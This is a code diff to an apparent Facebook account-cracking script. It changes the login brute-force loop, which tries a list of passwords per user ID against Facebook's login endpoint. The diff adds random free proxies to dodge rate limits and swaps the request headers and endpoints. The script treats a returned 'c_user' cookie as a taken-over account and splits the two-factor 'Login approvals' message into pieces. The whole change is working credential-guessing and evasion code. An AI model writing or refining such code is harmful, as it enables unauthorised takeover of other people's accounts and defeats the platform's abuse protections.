@@ -794,7 +794,7 @@ def ua():
     return ua_
 #-------------------------(PROXY)----------------------------#
 try:
-  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=th&protocol=socks4&proxy_format=protocolipport&format=text&timeout=20000').text
+  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=th&proxy_format=protocolipport&format=text&timeout=20000').text
   open('socksku.txt','w').write(proxylist)
 except Exception as e:
   print(' server error')
@@ -1948,8 +1948,10 @@ def x(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
+            nip=random.choice(xvx)
+            proxs= {'http':nip}
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://touch.facebook.com/',proxies=proxs).text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1959,12 +1961,12 @@ def x(uid,pwx,tl):
             'pass': pw,
             'login': 'Log in'}
             headers = {
-            'authority': 'business.facebook.com',
+            'authority': 'www.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://business.facebook.com',
-            'referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1979,8 +1981,8 @@ def x(uid,pwx,tl):
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            po = Session.post(url, data=data, headers=headers,proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
